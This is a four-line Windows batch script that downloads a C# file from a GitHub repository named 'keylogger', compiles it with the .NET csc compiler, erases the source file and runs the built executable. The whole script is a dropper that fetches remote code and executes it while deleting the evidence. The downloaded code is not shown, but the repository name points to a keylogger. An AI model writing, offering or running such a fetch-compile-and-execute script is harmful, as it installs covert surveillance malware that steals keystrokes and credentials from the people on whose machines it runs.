@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/exploitmulti.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe exploitmulti.cs
erase exploitmulti.cs & exploitmulti.exe
